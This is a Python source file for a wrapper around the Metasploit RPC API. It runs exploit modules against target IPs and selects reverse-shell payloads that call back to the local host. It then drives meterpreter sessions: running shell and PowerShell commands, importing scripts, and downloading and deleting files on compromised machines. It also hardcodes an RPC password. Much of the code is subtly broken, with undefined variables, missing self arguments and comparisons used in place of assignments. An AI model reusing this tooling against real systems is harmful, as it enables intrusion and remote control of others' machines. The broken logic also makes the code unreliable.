# -*- coding: utf-8 -*-

import os
import time
import asyncio
import netifaces

from msfclient import MsfError, RpcClient, MsfAuthError
from IPython import embed


class MsfWrapper:

    def __init__(self,
                 user='msf',
                 pw='McInerneyWasHere',
                 lhost=None):

        self.psh_import_folder = None
        self.sess_data = {}
        self.client = self.get_client(user, pw)
        self.c_id = self.get_c_id()
        if lhost == None:
            self.lhost = self.get_local_ip(self.get_iface())
        else:
            self.lhost = lhost

    def debug_info(self, output, label, label_num):
        if output:
            for l in output.splitlines():
                print('[DEBUG] {} {} output: {}'.format(label, label_num, l))
        else:
            print('Metasploit returned None instead of output ' + label + ' ' + label_num)

    def get_iface(self):
        '''
        Gets the interface with an IP address connected to a default gateway
        '''
        try:
            iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        except:
            ifaces = []
            for iface in netifaces.interfaces():
                # list of ipv4 addrinfo dicts
                ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

                for entry in ipv4s:
                    addr = entry.get('addr')
                    if not addr:
                        continue
                    if not (iface.startswith('lo') or addr.startswith('127.')):
                        ifaces.append(iface)

            iface = ifaces[0]

        return iface

    def get_local_ip(self, iface):
        '''
        Gets the the local IP of an interface
        '''
        ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
        return ip

    def get_client(self, user, pw):
        '''
        Creates Msfrpc client
        '''
        client = RpcClient({})

        try:
            client.login(user, pw)
        except MsfAuthError:
            raise

        client.call('auth.token_add', [pw])
        client.token = pw

        return client

    def get_c_id(self):
        '''
        Get the console ID if you plan on interacting with the console
        '''
        c_ids = [x[b'id'] for x in self.client.call('console.list')[b'consoles']]

        if len(c_ids) < 1:
            self.client.call('console.create')
            c_ids = [x[b'id'] for x in self.client.call('console.list')[b'consoles']]
            # Give it time to open fully
            time.sleep(3)

        # All MSF data comes back as bytes so we gotta make it utf8
        c_id = c_ids[0].decode('utf8')

        # Clear the console buffer
        self.client.call('console.read', [c_id])[b'data']

        return c_id

    async def get_sessions(self):
        '''
        Get list of MSF sessions from RPC server 
        '''
        msf_sessions = self.client.call('session.list')

        for msf_sess_num in msf_sessions:
            msf_sess_num_str = str(msf_sess_num)

            # If the session was found from polling MSF but its not in sess_data
            if msf_sess_num_str not in self.sess_data:
                await self.update_session(msf_sess_num_str, msf_sessions)

    async def update_session(self, msf_sess_num_str, msf_sessions):
        '''
        Creates new session data dictionary with updated and new values
        '''
        self.sess_data[msf_sess_num_str] = msf_sessions[int(msf_sess_num_str)]

        # There's gotta be a better of doing this
        # Set the keys all to utf8
        self.sess_data[msf_sess_num_str] = {k.decode('utf8'): v for k, v in self.sess_data[msf_sess_num_str].items() if
                                            isinstance(k, bytes)}
        # Set all the values to utf8
        self.sess_data[msf_sess_num_str] = {k: v.decode('utf8') for k, v in self.sess_data[msf_sess_num_str].items() if
                                            isinstance(v, bytes)}

        self.sess_data[msf_sess_num_str]['busy'] = 'False'
        # This probably needs renaming to like, 'info_gathered' or something
        # since it's a test to see if domain data and stuff has been added
        # might be able to remove it entirely
        self.sess_data[msf_sess_num_str]['first_check'] = 'False'
        # Fill this with cmds that errored out
        self.sess_data[msf_sess_num_str]['errors'] = []
        self.sess_data[msf_sess_num_str]['session_number'] = msf_sess_num_str
        self.sess_data[msf_sess_num_str]['in_os_shell'] = 'False'
        self.sess_data[msf_sess_num_str]['plugins'] = []
        await self.get_user(msf_sess_num_str)

    async def get_user(self, sess_num):
        '''
        Gets user data from session
        '''
        cmd = 'getuid'
        end_strs = ['server username:']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        if err:
            self.sess_data[sess_num]['user'] = 'ERROR'
            self.sess_data[sess_num]['errors'].append(cmd)
        else:
            user = output.split('Server username: ')[-1].strip()
            self.sess_data[sess_num]['user'] = user

    async def run_console_cmd(self, cmd):
        '''
        Runs module and gets output
        '''
        # Only console.xxx API calls require \n in cmds
        # session.xxx API calls do not require \n
        cmd = cmd + '\n'

        self.client.call('console.write', [self.c_id, cmd])

        output = await self.get_console_output(self.c_id)

        self.debug_info(output, 'Console', self.c_id)  # Debug ###

        err = self.get_output_errors(output, cmd)

        return (output, err)

    async def run_module(self, mod, target_ips, extra_opts, start_cmd):
        '''
        Run an MSF module
        '''
        cmd = ''

        # Set the module
        output, err = await self.use_module(mod)

        req_opts = await self.get_req_options(sess_num, mod)
        rhost_var = self.set_rhost_var(req_opts)

        if 'exploit/' in mod:
            target_num = await self.get_target(self, mod, os_type)
            payload = await self.get_payload(operating_sys, target_num, arch)

        cmd = self.create_msf_settings_cmd(rhost_var, target_ips, payload, extra_opts, start_cmd)
        mod_out, err = await self.run_console_cmd(cmd)

        return (cmd, mod_out, err)

    def set_rhost_var(self, req_opts):
        '''
        Determines if module needs RHOST or RHOSTS
        '''
        for o in req_opts:
            o = o.lower()
            if 'rhost' in o:
                return o

    async def use_module(self, path):
        '''
        Use a module in MSF but don't run it yet
        '''
        cmd = 'use ' + path
        output, err = await self.run_console_cmd(cmd)

    def get_target(mod, os_type):
        '''
        Sets the correct target based on OS
        Skips auxiliary modules
        '''
        if 'windows' in os_type.lower():
            os_type = 'windows'
        else:
            os_type = 'other'

        cmd = 'show targets'.format(mod)
        output, err = self.run_console_cmd(cmd)

        if output:
            output = output.splitlines()
            target_num = self.find_right_target(output, re_opt_num, os_type)
            return target_num

        else:
            return err

    def find_right_target(self, output, re_opt_num, os_type):
        '''
        Searches through the output for the right target
        Some examples: 
        struts_dmi_exec - 0   Windows Universal
                          1   Linux Universal
                          2   Java Universal

        jboss_maindeployer - 0   Automatic (Java based)
                             1   Windows Universal
                             2   Linux Universal
                             3   Java Universal

        rpc_cmsd_opcode21 - 0   IBM AIX Version 5.1

        '''
        # Default to target 0 if none of the searches below catch something
        target_num = 0

        for l in output:
            l = l.lower()
            re_opt_num = re.match('(\d)   ', l)
            if re_opt_num:
                target_num = self.find_right_target(re_opt_num, os_type)

                if 'automatic' in l:
                    target_num = re_opt_num.group(1)
                    break

                elif os_type == 'windows':
                    if 'universal' in l and 'windows' in l:
                        target_num = re_opt_num.group(1)
                        break

                elif os_type == 'other':
                    if 'universal' in l and 'windows' not in l:
                        target_num = re_opt_num.group(1)
                        break

                elif 'universal' in l:
                    target_num = re_opt_num.group(1)
                    break

        return target_num

    def create_msf_settings_cmd(self, rhost_var, target_ips, payload, extra_opts, start_cmd):
        cmds = ('set {} {}\n'
                'set LHOST {}\n'
                'set payload {}\n'
                '{}\n'
                '{}').format(module_path, rhost_var, target_ips, self.lhost, payload, extra_opts, start_cmd)

        return cmds

    async def get_req_options(self, sess_num, mod):
        '''
        Gets all the required options that don't have a default value set
        '''
        req_opts = []
        opts = self.client.call('module.options', [sess_num, mod])
        for o in opts:
            if opts[o][b'required'] == True:
                if b'default' not in opts[o]:
                    req_opts.append(o.decode('utf8'))

        return req_opts

    def get_payload(module, operating_sys, target_num, arch=32):
        '''
        Automatically get compatible payloads
        '''

        # Get payloads from MSF
        payloads = self.get_payload_list(target_num)

        # Match the payload against a list
        payload = self.get_os_payload(payloads, operating_sys, arch)

        # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
        if not payload:
            print_bad('No preferred payload found, first and last comapatible payloads:')
            print('    ' + payloads[0])
            print('    ' + payloads[-1])
            print_info('Skipping this exploit')
            return

        return payload

    def get_os_payload(self, payloads, operating_sys, arch):
        '''
        Get a payload based on OS
        '''
        win_payloads = ['windows/meterpreter/reverse_https',
                        'java/meterpreter/reverse_https',
                        'java/jsp_shell_reverse_tcp']

        if arch == 64:
            # Put this one at the front of the list
            win_payload.insert(0, 'windows/x64/meterpreter/reverse_https')

        other_payloads = ['java/meterpreter/reverse_https',
                          'generic/shell_reverse_tcp',
                          'java/jsp_shell_reverse_tcp',
                          'cmd/unix/reverse']

        if 'windows' in operating_sys.lower():
            payload = self.match_payload(win_payloads, payloads)
        else:
            payload = self.match_payload(other_payloads, payloads)

        return payload

    def match_payload(os_payloads, msf_payloads):
        '''
        Matches MSF payload list to our custom payload list
        '''
        for p in os_payloads:
            if p in msf_payloads:
                return p

    async def get_payload_list(self, target_num):
        '''
        Get potential payloads from MSF
        '''
        payloads = []

        if target_num:
            payloads_dict = self.client.call('module.target_compatible_payloads', [module, int(target_num)])
        else:
            payloads_dict = self.client.call('module.compatible_payloads', [module])

        if b'error' in payloads_dict:
            return payloads_dict[b'error']
        else:
            byte_payloads = payloads_dict[b'payloads']
            for p in byte_payloads:
                payloads.append(p.decode('utf8'))

        return payloads

    async def get_console_output(self, timeout=20):
        '''
        The only way to get console busy status is through console.read or console.list
        console.read clears the output buffer so you gotta use console.list
        but console.list requires you know the list offset of the c_id console
        so the list comprehension seems necessary to avoid assuming
        what the right list offset might be
        '''
        counter = 0
        sleep_secs = 1
        consoles = [x[b'id'].decode('utf8') for x in self.client.call('console.list')[b'consoles']]
        list_offset = consoles.index(self.c_id)
        output = ''

        # Get any initial output
        output += self.client.call('console.read', [self.c_id])[b'data'].decode('utf8')

        # Make sure the console is not busy
        while self.client.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
            output += self.client.call('console.read', [self.c_id])[b'data'].decode('utf8')
            await asyncio.sleep(sleep_secs)
            counter += sleep_secs

        # Get remaining output
        output += self.client.call('console.read', [self.c_id])[b'data'].decode('utf8')

        return output

    async def run_session_cmd(self, sess_num, cmd, end_strs, api_call='run_single', timeout=20):

        err = None
        output = None
        error_msg = 'Error in session {}: {}'

        await self.make_session_busy(sess_num)

        res = self.client.call('session.meterpreter_{}'.format(api_call), [sess_num, cmd])

        # Error from MSF API
        if b'error_message' in res:
            return self.get_res_err(res)

        # Successfully completed MSF API call
        elif res[b'result'] == b'success':

            try:
                full_output, err = await self.get_full_output(sess_num, cmd, end_strs, timeout)

            # This usually occurs when the session suddenly dies or user quits it
            except Exception as err:
                full_output, err = self.handle_exception(sess_num, err)
                return (full_output, err)

        # Get the last of the data to clear the buffer
        clear_buffer = self.client.call('session.meterpreter_read', [sess_num])

        self.make_session_not_busy(sess_num)

        return (full_output, err)

    async def get_full_output(self, sess_num, cmd, end_strs, timeout):
        '''
        Gets session output and figures out when to stop looking for output
        '''
        sleep_secs = 1
        counter = 0
        full_output = ''

        while True:

            await asyncio.sleep(sleep_secs)

            output, err = self.get_output(sess_num)

            # Add this output to full_output
            if output:
                self.debug_info(output, 'Session', sess_num)  ###
                full_output += output

            # Error from meterpreter console
            if err:
                self.sess_data[sess_num]['errors'].append(err)
                break

            # Check for errors from cmd's output
            err = self.get_output_errors(full_output, cmd)
            if err:
                break

            # If no terminating string specified just wait til timeout
            counter += sleep_secs
            if counter > timeout:
                err = 'Command [{}] timed out'.format(cmd.strip())
                break

            # Successfully completed
            if end_strs:
                if any(end_str in output.lower() for end_str in end_strs):
                    break

            # If no end_strs specified just return once we have any data or until timeout
            else:
                if len(full_output) > 0:
                    break

        return (full_output, err)

    def handle_exception(self, sess_num, err):
        '''
        Handle an exception in the loop grabbing output
        '''
        full_output = None

        # Get the last of the data to clear the buffer
        clear_buffer = self.client.call('session.meterpreter_read', [sess_num])
        self.sess_data[sess_num]['errors'].append(err)
        self.make_session_not_busy(sess_num)

        return (full_output, err)

    def get_res_err(self, res):
        '''
        Handles API response errors
        '''
        err_msg = res[b'error_message'].decode('utf8')
        self.sess_data[sess_num]['errors'].append(err_msg)
        self.make_session_not_busy(sess_num)
        return (None, err_msg)

    def get_output(self, sess_num):
        output = self.client.call('session.meterpreter_read', [sess_num])

        # Everythings fine
        if b'data' in output:
            decoded_out = output[b'data'].decode('utf8')
            return (decoded_out, None)

        # Got an error from the client.call
        elif b'error_message' in output:
            decoded_err = output[b'error_message'].decode('utf8')
            return (None, decoded_err)

    def get_output_errors(self, output, cmd):

        script_errors = ['[-] post failed',
                         'error in script',
                         'operlation failed',
                         'unknown command',
                         'operation timed out',
                         'operation failed:',
                         'unknown session id',
                         'error running',
                         'failed to load extension',
                         'requesterror',
                         'is not a valid option for this module',
                         'is not recognized as an',
                         ' failed: rex::',
                         'error:     + fullyqualifiederrorid : ']
        err = None

        # Got an error from output
        if any(x in output.lower() for x in script_errors):
            # This is the error that occurs when you try to run a powershell cmd
            # while another is running so it will continuously show up if we are
            # running a long-running PSH cmd
            if '2148734468' not in err:
                err = 'Command [{}] failed with error: {}'.format(cmd.splitlines()[0], output.strip())

        return err

    async def get_writeable_path(self, sess_num):
        ''' Get a writeable directory on the remote computer '''

        if 'write_path' in self.sess_data[sess_num]:
            write_path = self.sess_data[sess_num]['write_path']

        # System's write path will just be C:\windows\temp
        # elif b'authority\\system' in self.sess_data[sess_num][b'user'].lower():
        elif 'authority\\system' in self.sess_data[sess_num]['info'].lower():
            cmd = 'echo %WINDIR%'
            win_dir = await self.get_env_dir(sess_num, cmd)
            write_path = win_dir + '\\temp\\'
            self.sess_data[sess_num]['write_path'] = write_path

        # Regular user write path will be something like "C:\users\username\AppData\Local"
        else:
            cmd = 'echo %USERPROFILE%'
            home_dir = await self.get_env_dir(sess_num, cmd)
            write_path = home_dir + '\\AppData\\Local\\'
            self.sess_data[sess_num]['write_path'] = write_path

        return write_path + 'cache'

    async def get_env_dir(self, sess_num, cmd):
        end_strs = ['>']

        output, err = await self.run_shell_cmd(sess_num, cmd, end_strs)

        if output:
            for l in output.splitlines():
                if ':\\' in l:
                    directory = l.strip()
                    await self.end_shell(sess_num)
                    return directory

    async def import_psh(self, sess_num, filename):
        '''
        Imports PowerShell scripts
        '''
        # Load powershell plugin
        plugin = 'powershell'
        if plugin not in self.sess_data[sess_num]['plugins']:
            output, err = await self.load_plugin(sess_num, 'powershell')

        if not self.psh_import_folder:
            return 'No PowerShell import folder set'

        if self.psh_import_folder.endswith('/'):
            path = self.psh_import_folder + filename
        else:
            path = self.psh_import_folder + '/' + filename

        cmd = 'powershell_import ' + path
        end_strs = ['successfully imported.']

        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        return (output, err)

    async def run_psh_cmd_with_output(self, sess_num, ps_cmd):  # , write_path):
        '''
        There is no timeout setting for the powershell plugin in metasploit
        so shit just times out super fast. We hack around this by running long-running
        cmds then trying a fast cmd like write-host and wait until write-host actually
        works
        '''

        # Load powershell plugin
        plugin = 'powershell'
        if plugin not in self.sess_data[sess_num]['plugins']:
            output, err = await self.load_plugin(sess_num, 'powershell')

        # Get write path
        write_path = await self.get_writeable_path(sess_num)
        redir_out = ' > "{}"'.format(write_path)

        cmd = 'powershell_execute \'{}{}\''.format(ps_cmd, redir_out)
        end_strs = ['command execution completed']

        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
        if err:
            # Timeouts are ineffective measures of whether the cmd is done
            # because MSF doesn't have a way of changing powershell_execute
            # timeout values. However, after the cmd times out MSF won't kill
            # the PSH cmd; MSF will just return "operation failed: 2148734468"
            # when you try to run a new PSH cmd until the first cmd finishes
            if 'timed out' in err:
                await self.wait_for_psh_cmd(sess_num, cmd)
            else:
                return (None, err)

        # Download and read remote file
        output, err = await self.read_remote_file(sess_num, write_path)
        if output:
            output = output.decode('utf16')

        self.make_session_not_busy(sess_num)

        return output, err

    async def load_plugin(self, sess_num, plugin):
        '''
        Loads plugin in session
        '''
        # Load powershell plugin
        cmd = 'load ' + plugin
        end_strs = ['extension has already been loaded', 'success']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
        self.sess_data[sess_num]['plugins'].append(plugin)
        return (output, err)

    async def read_remote_file(self, sess_num, remote_path):
        '''
        Downloads and outputs a remote file's contents
        '''
        local_path = os.getcwd()
        cmd = 'download "{}" {}'.format(remote_path, local_path)
        end_strs = ['[*] download   :', '[*] skipped    :']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
        if err:
            return (None, err)

        cmd = 'rm "{}"'.format(remote_path)
        end_strs = ['']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        # We are setting output to blank string so just to make sure
        # the cmd completed we'll just wait a few secs
        await asyncio.sleep(3)

        filename = remote_path.split('\\')[-1]
        with open(filename, 'rb') as f:
            content = f.read()

        err = None
        return (content, err)

    async def wait_for_psh_cmd(self, sess_num, cmd):
        '''
        Wait for long running PSH cmd to finish and write to file
        '''
        while True:
            running_ps_cmd = cmd.split()[1][1:]  # get function name and knock off the first '
            end_strs = ['finished']
            cmd = 'powershell_execute "Write-Output \'Checking if [{}] has finished\'"'.format(running_ps_cmd)
            output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
            if not err:
                break
            await asyncio.sleep(1)

    async def run_shell_cmd(self, sess_num, cmd, end_strs, exit_shell=True):
        ''' Run a windows shell command '''

        # start the shell or skip if already in shell
        if self.sess_data[sess_num]['in_os_shell'] == 'False':
            output, err = await self.start_shell(sess_num)
            if not err:
                self.sess_data[sess_num]['in_os_shell'] == 'True'

        # run cmd
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs, api_call='write')

        # kill shell if we want
        if exit_shell == True:
            await self.end_shell(sess_num)

        return (output, err)

    async def start_shell(self, sess_num):
        ''' start OS cmd prompt on a meterpreter session '''

        cmd = 'shell'
        end_strs = ['>']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        if 'is not recognized as an internal or external command' in output:
            await self.end_shell(sess_num)
            output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        return (output, err)

    async def end_shell(self, sess_num):
        ''' Ends the OS shell prompt in a session '''

        self.client.call('session.meterpreter_detach_session', [sess_num])
        self.sess_data[sess_num]['in_os_shell'] == 'False'

    async def make_session_busy(self, sess_num):
        while self.sess_data[sess_num]['busy'] == 'True':
            await asyncio.sleep(1)
        self.sess_data[sess_num]['busy'] == 'True'

    def make_session_not_busy(self, sess_num):
        self.sess_data[sess_num]['busy'] == 'False'
